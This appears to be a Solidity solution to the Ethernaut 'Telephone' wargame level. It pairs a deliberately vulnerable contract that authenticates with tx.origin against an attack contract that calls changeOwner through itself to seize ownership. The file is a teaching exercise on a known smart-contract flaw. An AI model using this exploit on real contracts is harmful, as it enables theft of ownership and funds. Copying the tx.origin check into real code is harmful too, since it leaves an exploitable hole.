/**
 *Submitted for verification at Etherscan.io on 2021-03-10
*/

// In order to solve this level, deploy the contract TelephoneAttack and call the function NoThisIsPatrick with your Ethernaut instance address as input

pragma solidity ^0.6.3;

contract Telephone {

  address public owner;

  constructor() public {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}

contract TelephoneAttack{
    Telephone tel;
    
    function NoThisIsPatrick(address _victim) public{
         tel = Telephone(_victim);
         tel.changeOwner(msg.sender);
    }
}